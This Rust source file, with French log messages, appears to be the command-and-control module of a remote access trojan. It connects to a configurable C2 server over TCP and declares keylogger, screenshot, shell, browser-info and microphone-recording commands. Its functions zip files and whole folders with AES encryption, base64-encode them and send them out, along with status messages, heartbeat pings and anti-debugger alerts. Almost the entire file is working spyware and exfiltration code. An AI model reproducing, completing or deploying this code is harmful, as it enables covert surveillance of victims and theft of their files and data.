use anyhow::Result;
use base64::engine::Engine;
use serde::Serialize;
use std::fs::File;
use std::io::prelude::*;
use std::io::Read;
use std::path::Path;
use std::sync::Arc;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tempfile::NamedTempFile;
use walkdir::WalkDir;
use zip::result::ZipResult;
use zip::write::SimpleFileOptions;
use zip::{AesMode, CompressionMethod};

const C2_ADDR: &str = "127.0.0.1";
const C2_PORT: u16 = 5555;

enum _Status {
    SUCCESSFUL,
    FAILED,
}

#[derive(Serialize)]
pub struct CommandMapping {
    pub keylogger: String,
    pub screenshot: String,
    pub logs: String,
    pub shell: String,
    pub network_scan: String,
    pub browser_info: String,
    pub mic_rec: String,
}

pub static TCP_SOCKET: once_cell::sync::Lazy<Arc<Mutex<Option<TcpStream>>>> =
    once_cell::sync::Lazy::new(|| Arc::new(Mutex::new(None)));

pub async fn connect_to_c2() -> Result<()> {
    let addr = format!("{}:{}", C2_ADDR, C2_PORT);
    match TcpStream::connect(&addr).await {
        Ok(socket) => {
            let mut socket_guard = TCP_SOCKET.lock().await;
            *socket_guard = Some(socket);
            println!("[+] Connecté au serveur C2: {}", addr);
            Ok(())
        }
        Err(e) => {
            Err(anyhow::anyhow!("Erreur connexion TCP: {}", e))
        }
    }
}

async fn send_data_tcp(data: &[u8]) -> Result<()> {
    let mut socket_guard = TCP_SOCKET.lock().await;
    
    if let Some(socket) = &mut *socket_guard {
        socket.write_all(data).await?;
        Ok(())
    } else {
        Err(anyhow::anyhow!("Socket TCP non connectée"))
    }
}



pub async fn send_directive_status(
    directive: &str,
    status: &str,
    message: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let body = serde_json::json!({
        "type": "status",
        "directive": directive,
        "status": status,
        "message": message
    });

    let json_str = serde_json::to_string(&body)?;
    send_data_tcp(json_str.as_bytes()).await?;
    send_data_tcp(b"\n").await?;
    
    Ok(())
}

pub async fn send_json_to_c2<T: Serialize>(data: &T) -> Result<()> {
    let json_str = serde_json::to_string(data)?;
    send_data_tcp(json_str.as_bytes()).await?;
    send_data_tcp(b"\n").await?;
    Ok(())
}

pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
    let json = serde_json::json!({
        "type": "result",
        "data": String::from_utf8_lossy(&data)
    });
    
    let json_str = serde_json::to_string(&json)?;
    send_data_tcp(json_str.as_bytes()).await?;
    send_data_tcp(b"\n").await?;
    
    Ok(())
}

pub async fn zip_file(filename: &Path) -> ZipResult<NamedTempFile> {
    let mut tmp_archive = NamedTempFile::new()?;
    {
        let mut zip = zip::ZipWriter::new(&mut tmp_archive);

        let mut file = File::open(filename)?;
        let mut buff = Vec::new();
        file.read_to_end(&mut buff)?;

        let options = SimpleFileOptions::default()
            .compression_method(CompressionMethod::Deflated)
            .with_aes_encryption(AesMode::Aes256, "password");

        let archive_name = filename.file_name().unwrap_or_default().to_string_lossy();

        zip.start_file(archive_name, options)?;
        zip.write_all(&buff)?;
        zip.finish()?;
    }

    Ok(tmp_archive)
}

pub async fn zip_dir(folder_path: &Path) -> ZipResult<NamedTempFile> {
    let mut tmp_archive = NamedTempFile::new()?;
    {
        let mut zip = zip::ZipWriter::new(&mut tmp_archive);

        let options = SimpleFileOptions::default()
            .compression_method(CompressionMethod::Deflated)
            .with_aes_encryption(AesMode::Aes256, "password");

        for entry in WalkDir::new(folder_path).into_iter().filter_map(Result::ok) {
            let path = entry.path();
            let relative_path = path.strip_prefix(folder_path).unwrap();

            if path.is_dir() {
                if !relative_path.as_os_str().is_empty() {
                    zip.add_directory(relative_path.to_string_lossy(), options)?;
                }
            } else if path.is_file() {
                let mut f = File::open(path)?;
                let mut buffer = Vec::new();
                f.read_to_end(&mut buffer)?;

                zip.start_file(relative_path.to_string_lossy(), options)?;
                zip.write_all(&buffer)?;
            }
        }

        zip.finish()?;
    }

    Ok(tmp_archive)
}

pub async fn send_zip_to_c2(filepath: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let file_bytes = tokio::fs::read(filepath).await?;
    
    let json = serde_json::json!({
        "type": "result",
        "data": base64::engine::general_purpose::STANDARD.encode(&file_bytes),
        "filename": filepath.file_name().unwrap_or_default().to_string_lossy()
    });
    
    let json_str = serde_json::to_string(&json)?;
    send_data_tcp(json_str.as_bytes()).await?;
    send_data_tcp(b"\n").await?;
    
    Ok(())
}

pub async fn send_mapping(mapping: &CommandMapping) -> Result<(), Box<dyn std::error::Error>> {
    let json = serde_json::json!({
        "type": "mapping",
        "data": mapping
    });

    let json_str = serde_json::to_string(&json)?;
    send_data_tcp(json_str.as_bytes()).await?;
    send_data_tcp(b"\n").await?;
    
    Ok(())
}

pub async fn send_anti_debug_alert() {
    let _ = send_directive_status("anti_debug", "warning", "Debugger détecté").await;
}

pub async fn ping_c2() -> Result<(), Box<dyn std::error::Error>> {
    let json = serde_json::json!({
        "type": "ping",
        "data": "alive"
    });

    let json_str = serde_json::to_string(&json)?;
    send_data_tcp(json_str.as_bytes()).await?;
    send_data_tcp(b"\n").await?;
    
    Ok(())
}
